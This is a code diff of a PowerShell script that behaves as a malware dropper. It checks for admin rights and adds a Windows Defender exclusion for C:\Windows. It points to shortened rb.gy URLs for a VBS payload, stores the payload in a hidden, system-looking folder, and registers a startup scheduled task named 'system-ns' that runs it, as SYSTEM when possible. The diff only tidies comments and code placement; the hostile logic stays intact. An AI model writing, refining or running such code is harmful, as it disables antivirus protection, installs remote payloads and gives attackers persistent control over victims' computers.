@@ -3,22 +3,17 @@ $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.Windo
 
 if ($isAdmin) {
     Write-Output "Running as Administrator"
-
-    # Admin rights detected
     $installPath = "C:\Windows"
     $scriptVbsUrl = "https://rb.gy/w3a7hb"
-
     # Windows Defender Exclusion
     Add-MpPreference -ExclusionPath $installPath
 } else {
     Write-Output "Not running as Administrator"
-
-    # No admin rights
     $installPath = Join-Path $env:USERPROFILE "System"
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
-# Create the installation directory if it doesn't exist
+# Create the installation directory if it doesn’t exist
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
@@ -44,24 +39,21 @@ attrib +H $scriptVbsPath
 
 # Define task parameters
 $taskName = "system-ns"
-$action = New-ScheduledTaskAction -Execute $scriptVbsPath
-$trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
     if ($isAdmin) {
-        # If admin rights, run as NT AUTHORITY\SYSTEM using PowerShell
+        # Admin: Use Register-ScheduledTask as SYSTEM
+        $action = New-ScheduledTaskAction -Execute $scriptVbsPath
+        $trigger = New-ScheduledTaskTrigger -AtStartup
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
         Start-ScheduledTask -TaskName $taskName
     } else {
-        # If not admin, use CMD to run schtasks /create
+        # Non-Admin: Use schtasks /create
         $tr = "wscript.exe \`"$scriptVbsPath\`""
         cmd /c "schtasks /create /tn $taskName /tr $tr /sc ONSTART /ru $env:USERNAME /it /f"
-        
-        # Check if task creation succeeded
         if ($LASTEXITCODE -eq 0) {
-            # Apply additional settings using PowerShell
             Set-ScheduledTask -TaskName $taskName -Settings $settings
             Start-ScheduledTask -TaskName $taskName
         } else {
